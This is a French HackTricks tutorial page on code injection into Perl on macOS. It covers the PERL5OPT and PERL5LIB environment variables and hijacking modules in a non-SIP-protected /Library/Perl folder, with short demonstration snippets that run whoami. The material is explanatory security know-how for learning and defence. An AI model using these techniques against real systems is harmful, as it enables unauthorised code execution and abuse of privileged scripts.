# Injection d'applications Perl macOS

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}

## Via la variable d'environnement `PERL5OPT` & `PERL5LIB`

En utilisant la variable d'environnement PERL5OPT, il est possible de faire exécuter des commandes arbitraires par Perl.\
Par exemple, créez ce script :

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Maintenant **exportez la variable d'environnement** et exécutez le script **perl** :
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Une autre option consiste à créer un module Perl (par exemple `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

Et ensuite utiliser les variables d'environnement :
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Via dépendances

Il est possible de lister l'ordre des dossiers de dépendances de Perl en cours d'exécution :
```bash
perl -e 'print join("\n", @INC)'
```
Ce qui renverra quelque chose comme :
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Certaines des dossiers retournés n'existent même pas, cependant, **`/Library/Perl/5.30`** existe, il n'est **pas** protégé par **SIP** et il est **avant** les dossiers **protégés par SIP**. Par conséquent, quelqu'un pourrait abuser de ce dossier pour ajouter des dépendances de script afin qu'un script Perl à haut privilège le charge.

{% hint style="warning" %}
Cependant, notez que vous **devez être root pour écrire dans ce dossier** et de nos jours vous obtiendrez ce **prompt TCC**:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Par exemple, si un script importe **`use File::Basename;`** il serait possible de créer `/Library/Perl/5.30/File/Basename.pm` pour exécuter du code arbitraire.

## Références

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
